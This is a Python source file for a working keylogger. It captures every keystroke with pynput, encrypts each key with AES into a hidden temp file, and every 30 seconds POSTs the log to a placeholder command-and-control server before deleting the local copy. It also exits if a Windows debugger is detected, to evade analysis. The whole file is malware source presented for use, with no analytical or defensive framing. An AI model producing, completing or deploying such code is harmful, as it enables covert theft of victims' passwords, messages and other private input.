import ctypes
import threading
from pynput import keyboard
from Crypto.Cipher import AES
import base64
import os
import time
import sys
import requests  # Added for actual HTTP requests

# --- Configuration ---
C2_SERVER = "http://your-c2-server.com/log"  # Replace with actual C2 URL
LOG_FILE = os.path.join(os.getenv("TEMP", "/tmp"), ".keylog.dat")
KEY = b"YourKey123456789"  # Must be 16/24/32 bytes (change this!)
IV = b"InitializationVe"   # Change this too!

# --- AES Encryption Wrapper ---
def encrypt_data(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    pad_len = 16 - (len(data) % 16)
    data += chr(pad_len) * pad_len
    encrypted = cipher.encrypt(data.encode())
    return base64.b64encode(encrypted).decode()

# --- Log keystrokes securely ---
def log_keys(key):
    try:
        char = key.char
    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.space:
            char = " "
        elif key == keyboard.Key.enter:
            char = "\n"
        else:
            char = f"[{key.name}]"
    
    encrypted = encrypt_data(char)
    with open(LOG_FILE, "a") as f:
        f.write(encrypted + "\n")

# --- Send logs to C2 ---
def send_logs():
    while True:
        time.sleep(30)  # Check every 30 seconds
        
        if not os.path.exists(LOG_FILE):
            continue
            
        try:
            with open(LOG_FILE, "r") as f:
                logs = f.read()
            
            # Actually send logs via HTTP POST
            try:
                requests.post(C2_SERVER, data={"logs": logs}, timeout=10)
                os.remove(LOG_FILE)
                print("[+] Logs sent successfully")
            except requests.RequestException as e:
                print(f"[!] Failed to send logs: {e}")
                
        except Exception as e:
            print(f"[!] Log processing error: {e}")

# --- Anti-Debug / Sandbox Detection ---
def detect_debug():
    try:
        # Windows-specific check
        if os.name == 'nt' and ctypes.windll.kernel32.IsDebuggerPresent():
            sys.exit(0)
    except:
        pass

# --- Main ---
if __name__ == "__main__":
    # Remove daemonization attempts (os.setsid())
    print(f"Keylogger started in current session. Logging to: {LOG_FILE}")
    
    listener = keyboard.Listener(on_press=log_keys)
    listener.start()

    # Start log sender as daemon thread
    threading.Thread(target=send_logs, daemon=True).start()

    try:
        while True:
            detect_debug()
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Exiting...")
        listener.stop()